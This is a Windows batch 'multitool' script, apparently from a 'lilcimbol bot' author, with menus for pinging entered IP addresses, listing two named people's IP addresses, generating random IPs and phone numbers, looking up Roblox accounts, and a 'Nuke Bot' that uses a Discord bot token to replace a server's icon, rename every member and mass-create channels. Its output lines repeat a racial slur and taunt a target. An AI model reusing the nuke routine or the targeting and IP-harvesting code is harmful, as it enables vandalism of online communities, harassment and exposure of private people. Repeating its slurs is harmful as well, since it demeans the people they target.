echo ⠀⢀⡇⢹⣄⠀⠀⠀⠀⣀⠉⠓⠶⢄⡀⠀⠀⠀⠀⠀⢀⣠⠴⠋⠣⣄⠀⠀⠀⠀⠀⠀⠀⠀⢠⠟⣸⣧⠀⠀⠀⠀⠀
echo ⠀⣴⣿⠋⠘⣆⠀⢰⠶⠤⢍⣛⣶⠤⠿⣷⣦⡀⠒⠚⡟⠀⠀⠀⠀⠈⠛⠢⠤⡄⠀⠀⢀⡴⢯⠴⣳⠇⠀⠀⠀⠀⠀
echo ⠀⠀⠉⠀⠀⠘⢦⡈⠻⣖⠤⣤⣉⣉⣹⣯⣭⠉⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⠛⣫⣼⠃⠀⠀⠀⠀⠀⠀
echo ⠀⠀⠀⠀⠀⠀⠀⠑⣄⠉⢦⡀⠀⠀⠈⠉⠁⠀⠀⣸⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⢿⣷⢚⡝⠁⠀⠀⠀⠀⠀⠀⠀
echo ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⢶⣷⠇⠀⠀⠀⠀⠀⣠⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⠷⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀
echo ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀







ping localhost -n 2 >nul
echo [44m      				    ██████╗ ██╗███╗   ██╗ ██████╗ ███████╗██████╗  [0m
ping localhost -n 1 >nul 
echo [44m     				    ██╔══██╗██║████╗  ██║██╔════╝ ██╔════╝██╔══██╗ [0m
ping localhost -n 1 >nul
echo [44m      				    ██████╔╝██║██╔██╗ ██║██║  ███╗█████╗  ██████╔╝ [0m
ping localhost -n 1 >nul
echo [44m      				    ██╔═══╝ ██║██║╚██╗██║██║   ██║██╔══╝  ██╔══██╗ [0m
ping localhost -n 1 >nul
echo [44m     				    ██║     ██║██║ ╚████║╚██████╔╝███████╗██║  ██║ [0m
ping localhost -n 1 >nul
echo [44m      				    ╚═╝     ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝ [0m
goto :eof



:Pinger
cls
call :banner3
echo.
echo.
setlocal enabledelayedexpansion
color c

:: Prompt for IPs and ping count
set /p "IP=    [? lilcimbol bot ?] | Enter Ip use comma for second: "
set /p "COUNT= [? lilcimbol bot ?] | How many times U want to ping: "
cls
:: Check internet by pinging Google's DNS first
ping 8.8.8.8 -n 1 >nul 2>&1
IF ERRORLEVEL 1 (
    echo Internet is DOWN. Unable to reach 8.8.8.8.
) ELSE (
    echo Internet is UP. Successfully reached 8.8.8.8.
)

:: Split the comma-separated IPs into individual IPs and loop through each
for %%A in (%IP%) do (
    echo Pinging IP: %%A for %COUNT% attempts...

    :: Loop through the number of pings to the provided IP
    for /l %%i in (1,1,%COUNT%) do (
        echo Pinging %%A... Attempt %%i
        ping %%A -n 1 >nul 2>&1  :: Ping once and suppress output
        
        :: Check if the ping was successful and print result
        IF ERRORLEVEL 1 (
            echo Attempt %%i: %%A [ lilcimbol bot ] NIGGER OFFLINE!
        ) ELSE (
            echo Attempt %%i: %%A [ lilcimbol bot ] NIGGER ONLINE!
			cls
        )
    )
)

:: Optional: Ping 127.0.0.1 continuously (can be removed if not needed)
ping -t 127.0.0.1 >nul
cls
echo Fuck that nigga he gone Like his dad?
pause
goto start


:Saved
cls
echo ---------------
echo Emmett: 24.88.206.166
echo AAron: 24.88.206.166 
echo ---------------
echo.
pause
goto start

:Website
setlocal enabledelayedexpansion
color f

:: Clear the screen at the start (optional, use carefully)
cls

:: Prompt for Website URL and ping count
set /p WEBSITE=" [? lilcimbol bot ?] | website:  "
set /p COUNT=" [? lilcimbol bot ?] | how many times: "

:: Check internet by pinging Google's DNS first
ping 8.8.8.8 -n 1 >nul 2>&1
IF ERRORLEVEL 1 (
    echo Internet is DOWN. Unable to reach 8.8.8.8.
) ELSE (
    echo Internet is UP. Successfully reached 8.8.8.8.
)

:: Loop through the number of pings to the provided website (without unnecessary output)
for /l %%i in (1,1,%COUNT%) do (
    echo Pinging %WEBSITE%... Attempt %%i
    ping %WEBSITE% -n 1 >nul 2>&1  :: Ping once and suppress output
    
    :: Check if the ping was successful and print result
    IF ERRORLEVEL 1 (
        echo Attempt %%i: %WEBSITE% OFFLINE
    ) ELSE (
        echo Attempt %%i: %WEBSITE% ONLINE
    )
)

:: Optional: Ping 127.0.0.1 continuously (can be removed if not needed)
ping -t 127.0.0.1 >nul
pause
goto start


:Information
cls
setlocal enabledelayedexpansion

:: Create a temporary file to capture the output
set "tempFile=%temp%\computer_info.txt"

:: Get the computer name using PowerShell
powershell -Command "(Get-ComputerInfo).CsName" > "%tempFile%"
set /p "computerName="<"%tempFile%"

:: Get the logged-in user name using PowerShell
powershell -Command "(Get-WmiObject -Class Win32_ComputerSystem).UserName" > "%tempFile%"
set /p "userName="<"%tempFile%"

:: Generate a random "code" (alphanumeric)
set "code="
for /L %%c in (1,1,10) do (
    set /a "randomChar=!random! %% 62"
    if !randomChar! lss 10 (
        set "char=!randomChar!"
    ) else if !randomChar! lss 36 (
        set "char=!randomChar!"
        set "char=!char: =A!"
    ) else (
        set "char=!randomChar!"
        set "char=!char: =a!"
    )
    set "code=!code!!char!"
)

:: Get network adapter details using PowerShell
powershell -Command "Get-NetAdapter | Select-Object -ExpandProperty Name" > "%tempFile%"
set /p "adapterName="<"%tempFile%"

:: Get IPv4 and IPv6 addresses using PowerShell
powershell -Command "Get-NetIPAddress | Where-Object {$_.AddressFamily -eq 'IPv4'} | Select-Object -ExpandProperty IPAddress" > "%tempFile%"
set /p "ipv4Address="<"%tempFile%"

powershell -Command "Get-NetIPAddress | Where-Object {$_.AddressFamily -eq 'IPv6'} | Select-Object -ExpandProperty IPAddress" > "%tempFile%"
set /p "ipv6Address="<"%tempFile%"

:: Handle if any values are empty
if not defined computerName set "computerName=Not available"
if not defined userName set "userName=Not available"
if not defined adapterName set "adapterName=Not available"
if not defined ipv4Address set "ipv4Address=Not available"
if not defined ipv6Address set "ipv6Address=Not available"

:: Print the information in a boxed format
echo ================================
echo =        Computer Info         =
echo ================================
echo Adapter name:  %adapterName%
echo Computer Name: %computerName%
echo Username: %userName%
echo Code: %code%
echo IPv4 address: %ipv4Address%
echo IPv6 address: %ipv6Address%
echo ================================
pause

:Phonegen
cls
setlocal enabledelayedexpansion

:: Ask for the number of phone numbers to generate
set /p "num= [? lilcimbol bot ?] | How many:  "

:: Loop to generate the phone numbers
for /L %%i in (1,1,%num%) do (
    set "phone="
    
    :: Generate first 3 digits (area code)
    for /L %%j in (1,1,3) do (
        set /a "randomDigit=!random! %% 10"
        set "phone=!phone!!randomDigit!"
    )
    set "phone=!phone!) "
    
    :: Generate second part (next 3 digits)
    for /L %%j in (1,1,3) do (
        set /a "randomDigit=!random! %% 10"
        set "phone=!phone!!randomDigit!"
    )
    set "phone=!phone! "
    
    :: Generate third part (last 4 digits)
    for /L %%j in (1,1,4) do (
        set /a "randomDigit=!random! %% 10"
        set "phone=!phone!!randomDigit!"
    )

    :: Output the formatted phone number
    echo Phone Number %%i: (!phone!)
)
pause
goto start


:IpGen
cls
setlocal enabledelayedexpansion

:: Ask the user how many IPs they want to generate and check
set /p "count= [? lilcimbol ?] | How Many?: "

:: Loop to generate the specified number of IPs
for /L %%i in (1,1,%count%) do (
    set /a "part1=!random! %% 256"
    set /a "part2=!random! %% 256"
    set /a "part3=!random! %% 256"
    set /a "part4=!random! %% 256"

    :: Generate the IP address
    set "ip=!part1!.!part2!.!part3!.!part4!"

    :: Ping the generated IP and check if it's reachable
    ping -n 1 !ip! > nul
    if !errorlevel! == 0 (
        echo Working IP: !ip!
    ) else (
        echo !ip! is not reachable.
    )
)

pause
goto start





:Matrix
cls
color a
mode 500
pause
:a

echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
goto a

:Roblox
:GetRobloxAccountCreationDate
cls
set /p username=Enter the Roblox username: 

:: Use Roblox API to get user information by username (first, we will search for the username to get the userId)
echo Fetching user data for %username%...
curl -s "https://users.roblox.com/v1/users/search?keyword=%username%" > user.json

:: Parse the userId from the JSON response (this assumes there's one user returned)
for /f "delims=" %%i in ('findstr /c:""id"" user.json') do set userId=%%i

:: Extract the userId number (this is to strip out the "id": value part)
for /f "tokens=2 delims=:" %%a in ("%userId%") do set userId=%%a
set userId=%userId:~1,-1%

:: Check if userId is empty (meaning user wasn't found)
if "%userId%"=="" (
    echo User not found.
    pause
    goto MENU
)

:: Now, fetch the creation date using the userId with the correct API endpoint
echo Fetching creation date for userId: %userId%...
curl -s "https://users.roblox.com/v1/users/%userId%" > user_info.json

:: Extract the creation date from the user_info.json file
for /f "delims=" %%i in ('findstr /c:""created"" user_info.json') do set creationDate=%%i

:: Check if creationDate is found and process it
if defined creationDate (
    :: Extract the date value (the format is "created": "YYYY-MM-DDTHH:MM:SSZ")
    for /f "tokens=2 delims=:" %%a in ("%creationDate%") do set creationDate=%%a
    set creationDate=%creationDate:~2,-2%
    echo The Roblox account "%username%" was created on: %creationDate%
) else (
    echo Could not retrieve the creation date for the user.
)

:: Cleanup
del user.json
del user_info.json

pause
goto MENU





:proxieChecker
setlocal enabledelayedexpansion

:: Ask the user for how many IPs they want to check
set /p num_ips=How many: 

:: Initialize the counter
set /a counter=0
set working_ips=

:: Loop to get the IP addresses
:input_ips
if %counter% geq %num_ips% goto check_ips
set /p IP=IP address #%counter%: 
set IPs[%counter%]=%IP%
set /a counter+=1
goto input_ips

:: Check each IP for availability
:check_ips
echo Checking IPs...
for /L %%i in (0,1,%num_ips%-1) do (
    ping -n 1 !IPs[%%i]! > nul
    if !errorlevel! == 0 (
        echo IP !IPs[%%i]! is working.
        set working_ips=!working_ips!!IPs[%%i]! 
    ) else (
        echo IP !IPs[%%i]! is non-working.
    )
)

:: Display all working IPs
echo Working IPs: !working_ips!

pause








:banner6


echo. 
echo.
echo    ▄     ▄   █  █▀ ▄███▄   █▄▄▄▄ 
echo     █     █  █▄█   █▀   ▀  █  ▄▀ 
echo ██   █ █   █ █▀▄   ██▄▄    █▀▀▌  
echo █ █  █ █   █ █  █  █▄   ▄▀ █  █  
echo █  █ █ █▄ ▄█   █   ▀███▀     █   
echo █   ██  ▀▀▀   ▀             ▀    
echo.
echo.
goto :eof

:menu2
cls
call :banner6
echo.
echo ╔═════════════════════════════════════╗
echo ║         Lilcimbol Nuke Bot          ║
echo ╚═════════════════════════════════════╝
echo.

:: Get user input
set /p GUILD_ID="         │ [? Lilcimbol bot ?] │ Server ID: "              [0m
set /p TOKEN="            │ [? Lilcimbol bot ?] │ Enter bot token: "        [0m
set /p CHANNEL_COUNT="    │ [? Lilcimbol bot ?] │ How many channels: "      [0m
set /p CHANNEL_NAME="     │ [? Lilcimbol bot ?] │ Name of channels: "       [0m
set /p MESSAGE="          │ [? Lilcimbol bot ?] │ Message: "                [0m
set /p IMAGE_URL="        │ [? Lilcimbol bot ?] │ URL of the image: "       [0m
set /p NEW_NICKNAME="     │ [? Lilcimbol bot ?] │ New nickname: "           [0m

:: Debugging - output only the guild ID and number of channels (never print the token)
echo Debug: GUILD_ID=%GUILD_ID%
echo Debug: Channels to create: %CHANNEL_COUNT%
echo Debug: Image URL: %IMAGE_URL%
echo Debug: New Nickname: %NEW_NICKNAME%
pause
cls

:: Download the image from the URL
echo │ [? Lilcimbol bot ?] │ Downloading the image from URL...
curl -L "%IMAGE_URL%" -o "server_icon.png"

:: Base64 encode the image
echo │ [? Lilcimbol bot ?] │ Encoding the image to Base64...
certutil -encode "server_icon.png" "server_icon.b64" >nul 2>&1

:: Read the Base64 content from the encoded file and store it in a variable
set /p BASE64_IMAGE=<"server_icon.b64"

:: Remove unwanted lines from Base64 output (certutil adds some extra lines that need to be removed)
set BASE64_IMAGE=%BASE64_IMAGE:~1%

:: Debugging - output the Base64 content (for checking purposes)
echo │ [? Lilcimbol bot ?] │ Base64 encoded image: %BASE64_IMAGE%
pause

:: Update the server icon via the Discord API
echo │ [? Lilcimbol bot ?] │ Changing server icon...
curl -X PATCH "https://discord.com/api/v10/guilds/%GUILD_ID%" ^
    -H "Authorization: Bot %TOKEN%" ^
    -H "Content-Type: application/json" ^
    -d "{\"icon\":\"%BASE64_IMAGE%\"}" >nul 2>&1

echo │ [? Lilcimbol bot ?] │ Server icon updated successfully!

:: Fetch the list of members (Paginated, if necessary)
echo │ [? Lilcimbol bot ?] │ Fetching member list...
curl -X GET "https://discord.com/api/v10/guilds/%GUILD_ID%/members?limit=1000" ^
    -H "Authorization: Bot %TOKEN%" > members.json

:: Loop through members and update their nicknames
for /F "tokens=*" %%A in (members.json) do (
    set member=%%A
    for /F "delims=:," %%B in ("%%A") do set user_id=%%B

    :: Update the user's nickname
    echo │ [? Lilcimbol bot ?] │ Changing nickname for user: %%B
    curl -X PATCH "https://discord.com/api/v10/guilds/%GUILD_ID%/members/%%B" ^
        -H "Authorization: Bot %TOKEN%" ^
        -H "Content-Type: application/json" ^
        -d "{\"nick\":\"%NEW_NICKNAME%\"}" >nul 2>&1
)

echo │ [? Lilcimbol bot ?] │ All member nicknames updated successfully!

:: Loop to create multiple channels
for /L %%i in (1,1,%CHANNEL_COUNT%) do (
    echo │ [? Lilcimbol bot ?] │ Creating channel: %CHANNEL_NAME%%%i
    curl -X POST "https://discord.com/api/v10/guilds/%GUILD_ID%/channels" ^
        -H "Authorization: Bot %TOKEN%" ^
        -H "Content-Type: application/json" ^
        -d "{\"name\": \"%CHANNEL_NAME%%%i\", \"type\": 0}" >nul 2>&1
)

cls
echo.
echo │ [? Lilcimbol bot ?] │ Nuked that dumb ass server
echo │ [? Lilcimbol bot ?] │ wanna @everyone? press 1
pause
goto start

:Rainbow
@echo off
color c
cls
echo               ...                                
echo              ;::::;                              
echo            ;::::; :;                              
echo          ;:::::'   :;                             
echo         ;:::::;     ;.                            
echo        ,:::::'       ;           OOO\           
echo        ::::::;       ;          OOOOO\            
echo        ;:::::;       ;         OOOOOOOO           
echo       ,;::::::;     ;'         / OOOOOOO          
echo     ;:::::::::`. ,,,;.        /  / DOOOOOO        
echo   .';:::::::::::::::::;,     /  /     DOOOO     
echo  ,::::::;::::::;;;;::::;,   /  /        DOOO     
echo ;`::::::`'::::::;;;::::: ,#/  /          DOOO   
echo :`:::::::`;::::::;;::: ;::#  /            DOOO   
echo ::`:::::::`;:::::::: ;::::# /              DOO   
echo `:`:::::::`;:::::: ;::::::#/               DOO
echo  :::`:::::::`;; ;:::::::::##                OO
echo  ::::`:::::::`;::::::::;:::#                OO
echo  `:::::`::::::::::::;'`:;::#                O
echo   `:::::`::::::::;' /  / `:#
echo    ::::::`:::::;'  /  /   `#                                                                                                                                 
set /p IP=Enter THE IP ADDRESS:  
echo.
:rainbow1
PING -n 1 %IP% | FIND "TTL="
IF ERRORLEVEL 1 (SET in=c & echo %IP% Smacked By Lilcimbol)
color 01
PING -n 1 %IP% | FIND "TTL="
IF ERRORLEVEL 1 (SET in=c & echo %IP% Smacked By Lilcimbol)
color 02
PING -n 1 %IP% | FIND "TTL="
IF ERRORLEVEL 1 (SET in=c & echo %IP% Smacked By Lilcimbol)
color 03
PING -n 1 %IP% | FIND "TTL="
IF ERRORLEVEL 1 (SET in=c & echo %IP% Smacked By Lilcimbol)
color 04
PING -n 1 %IP% | FIND "TTL="
IF ERRORLEVEL 1 (SET in=c & echo %IP% Smacked By Lilcimbol)
color 05
PING -n 1 %IP% | FIND "TTL="
IF ERRORLEVEL 1 (SET in=c & echo %IP% Smacked By Lilcimbol)
color 06
PING -n 1 %IP% | FIND "TTL="
IF ERRORLEVEL 1 (SET in=c & echo %IP% Smacked By Lilcimbol)
color 07
PING -n 1 %IP% | FIND "TTL="
IF ERRORLEVEL 1 (SET in=c & echo %IP% Smacked By Lilcimbol)
color 08
PING -n 1 %IP% | FIND "TTL="
IF ERRORLEVEL 1 (SET in=c & echo %IP% Smacked By Lilcimbol)
color 09
PING -n 1 %IP% | FIND "TTL="
IF ERRORLEVEL 1 (SET in=c & echo %IP% Smacked By Lilcimbol)
color 0b
PING -n 1 %IP% | FIND "TTL="
IF ERRORLEVEL 1 (SET in=c & echo %IP% Smacked By Lilcimbol)
color 0c
PING -n 1 %IP% | FIND "TTL="
IF ERRORLEVEL 1 (SET in=c & echo %IP% Smacked By Lilcimbol)
color 0d
PING -n 1 %IP% | FIND "TTL="
IF ERRORLEVEL 1 (SET in=c & echo %IP% Smacked By Lilcimbol)
color 0e
PING -n 1 %IP% | FIND "TTL="
IF ERRORLEVEL 1 (SET in=c & echo %IP% Smacked By Lilcimbol)
color 0f
PING -n 1 %IP% | FIND "TTL="
IF ERRORLEVEL 1 (SET in=c & echo %IP% Smacked By Lilcimbol)
goto rainbow1
